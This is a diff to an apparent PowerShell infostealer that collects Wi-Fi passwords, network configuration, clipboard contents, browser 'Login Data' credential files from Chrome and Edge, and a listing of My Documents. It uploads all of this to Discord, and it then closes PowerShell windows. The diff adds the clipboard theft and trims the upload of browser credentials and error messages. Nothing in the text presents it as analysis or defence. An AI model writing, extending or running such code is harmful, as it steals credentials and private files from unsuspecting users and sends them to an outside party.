@@ -54,7 +54,6 @@ try {
     Send-PayloadToDiscord -content $results
 } catch {
     Write-Host "Error extracting Wi-Fi credentials: $_"
-    Send-PayloadToDiscord -content "Error extracting Wi-Fi credentials: $_"
 }
 
 # Extract Network Configuration
@@ -63,28 +62,28 @@ try {
     Send-PayloadToDiscord -content "Network Configuration:`n$netConfig"
 } catch {
     Write-Host "Error extracting network configuration: $_"
-    Send-PayloadToDiscord -content "Error extracting network configuration: $_"
 }
 
-# Extract Browser Saved Credentials (Chrome and Edge)
+# Extract Clipboard Content
 try {
-    $browsers = @("Google\\Chrome", "Microsoft\\Edge")
+    $clipboard = Get-Clipboard
+    Send-PayloadToDiscord -content "Clipboard Content:`n$clipboard"
+} catch {
+    Write-Host "Error extracting clipboard content: $_"
+}
+
+# Extract Browser Saved Credentials
+try {
+    $browsers = @('Google\\Chrome', 'Microsoft\\Edge')
     foreach ($browser in $browsers) {
         $loginData = "$env:LOCALAPPDATA\$browser\User Data\Default\Login Data"
-        $localState = "$env:LOCALAPPDATA\$browser\User Data\Local State"
-        if (Test-Path $loginData -and Test-Path $localState) {
-            Add-Type -AssemblyName "System.Security"
-            $encryptedData = Get-Content $loginData -AsByteStream
+        if (Test-Path $loginData) {
             Send-FileToDiscord -filePath $loginData -fileName "$browser_LoginData"
-            Send-FileToDiscord -filePath $localState -fileName "$browser_LocalState"
-            Send-PayloadToDiscord -content "Browser: $browser - Login Data and Local State files uploaded."
-        } else {
-            Send-PayloadToDiscord -content "Browser: $browser - No credentials found."
+            Send-PayloadToDiscord -content "Browser: $browser - Login Data file uploaded."
         }
     }
 } catch {
     Write-Host "Error extracting browser credentials: $_"
-    Send-PayloadToDiscord -content "Error extracting browser credentials: $_"
 }
 
 # List Files in My Documents
@@ -93,7 +92,6 @@ try {
     Send-PayloadToDiscord -content "Files in My Documents:`n$myDocs"
 } catch {
     Write-Host "Error listing My Documents: $_"
-    Send-PayloadToDiscord -content "Error listing My Documents: $_"
 }
 
 # Close PowerShell Windows
